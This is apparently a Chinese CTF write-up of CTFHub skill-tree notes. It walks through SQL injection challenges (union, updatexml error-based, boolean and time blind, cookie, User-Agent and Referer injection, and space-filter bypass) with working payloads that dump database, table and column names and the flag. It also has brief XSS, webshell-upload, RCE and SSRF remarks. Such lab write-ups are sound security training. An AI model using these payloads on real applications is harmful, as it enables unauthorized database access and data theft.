# CTFHUB 技能树笔记

## SQL 注入

### 1. 整数型注入
- **判断字段数**：输入 `1 order by {val}`，逐步测试确定查询的字段数量。
  ![sql 1](/ctfhub/images/sql1.png)
- **查询数据库**：构造 `-1 union select 1,group_concat(schema_name) from information_schema.schemata`，显示所有数据库。
  ![sql 2](/ctfhub/images/sql2.png)
- **查询表**：构造 `-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'`，显示 `sqli` 数据库中的表。
  ![sql 3](/ctfhub/images/sql3.png)
- **查询字段**：构造 `-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'`，显示 `flag` 表的字段。
  ![sql 4](/ctfhub/images/sql4.png)
- **获取 Flag**：构造 `-1 union select 1,group_concat(flag) from sqli.flag`，获取 `flag`。
  ![sql 5](/ctfhub/images/sql5.png)

### 2. 字符型注入
- **判断字段数**：输入 `1' order by {val} #`，测试查询的字段数量。
  ![sql 6](/ctfhub/images/sql6.png)
- **查询数据库**：构造 `-1' union select 1,group_concat(schema_name) from information_schema.schemata #`，显示所有数据库。
  ![sql 7](/ctfhub/images/sql7.png)
- **查询表**：构造 `-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli' #`，显示 `sqli` 数据库中的表。
  ![sql 8](/ctfhub/images/sql8.png)
- **查询字段**：构造 `-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag' #`，显示 `flag` 表的字段。
  ![sql 9](/ctfhub/images/sql9.png)
- **获取 Flag**：构造 `-1' union select 1,group_concat(flag) from sqli.flag #`，获取 `flag`。
  ![sql 10](/ctfhub/images/sql10.png)

### 3. 报错注入
- **触发报错**：输入 `1' asdsad`，观察输出报错信息。
  ![sql 11](/ctfhub/images/sql11.png)
- **查询数据库**：构造 `1 or updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 3,1),0x7e),1)`，通过报错发现 `sqli` 数据库。
- **查询表**：构造 `1 or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='sqli' limit 1,1),0x7e),1)`，看到 `flag` 表。
- **查询字段**：构造 `1 or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='sqli' and table_name='flag' limit 0,1),0x7e),1)`，看到 `flag` 字段。
  ![sql 12](/ctfhub/images/sql12.png)
- **获取 Flag**：构造 `1 or updatexml(1,concat(0x7e,(select flag from sqli.flag limit 0,1),0x7e),1)`，找到 `flag`。
  ![sql 13](/ctfhub/images/sql13.png)

### 4. 布尔盲注
- **测试闭合**：构造 `1 and 1=1 #`、`1' and 1=1 #`、`1" and 1=1 #`、`1') and 1=1 #`、`1") and 1=1 #` 等，多次注入测试。
- **判断逻辑**：输入 `a`、`null`、`true`、`false` 等，发现只有 `true`、`1`、`2` 返回正常，推测后端代码为 `if(xxx)` 的形式，需返回 `true`。
- **构造语句**：使用 `if(length(select database())=1,1,0)`，结合脚本实现。
  ![sql 14](/ctfhub/images/sql14.png)
- **脚本参考**：[布尔盲注脚本](/ctfhub/geturl.py)

### 5. 时间盲注
- **检测注入**：输入 `1 and sleep(10)`，一发入魂，确认存在时间盲注。
  ![sql 15](/ctfhub/images/sql15.png)
- **使用工具**：结合 `sqlmap` 进行自动化测试。
  ![sql 16](/ctfhub/images/sql16.png)

### 6. MySQL 结构
- **特点**：MySQL 的 `information_schema` 库方便获取数据库、表、字段信息，利于注入。
- **找到注入点**：
  ![sql 17](/ctfhub/images/sql17.png)
- **获取 Flag**：
  ![sql 18](/ctfhub/images/sql18.jpeg)

### 7. Cookie 注入
- **测试注入**：
  ![sql 19](/ctfhub/images/sql19.jpeg)
- **抓包分析**：使用 Burp Suite 抓包。
  ![sql 20](/ctfhub/images/sql20.png)
- **找到闭合**：
  ![sql 21](/ctfhub/images/sql21.png)
- **获取 Flag**：
  ![sql 22](/ctfhub/images/sql22.png)

### 8. UA 注入
- **测试注入点**：将请求丢进 Burp Suite，修改 User-Agent 头部，测试注入点。
  ![sql 23](/ctfhub/images/sql23.png)
- **获取 Flag**：确认注入点后直接获取 `flag`。
  ![sql 24](/ctfhub/images/sql24.png)

### 9. Referer 注入
- **添加头部**：请求中无 Referer，手动添加并测试注入。
  ![sql 25](/ctfhub/images/sql25.png)
- **获取 Flag**：
  ![sql 26](/ctfhub/images/sql26.png)

### 10. 过滤空格
- **绕过方法**：用 `/**/` 代替空格。
  ![sql 27](/ctfhub/images/sql27.png)
- **获取 Flag**：
  ![sql 28](/ctfhub/images/sql28.png)

## XSS
CTFHUB的XSS题目很简单，找XSS平台，检查前端页面，注意构造闭合即可轻松通过，略。

## 文件上传
准备好Webshell和蚁剑，直接打通，略。

## RCE
简单文件包含和RCE，略。

## SSRF
略。
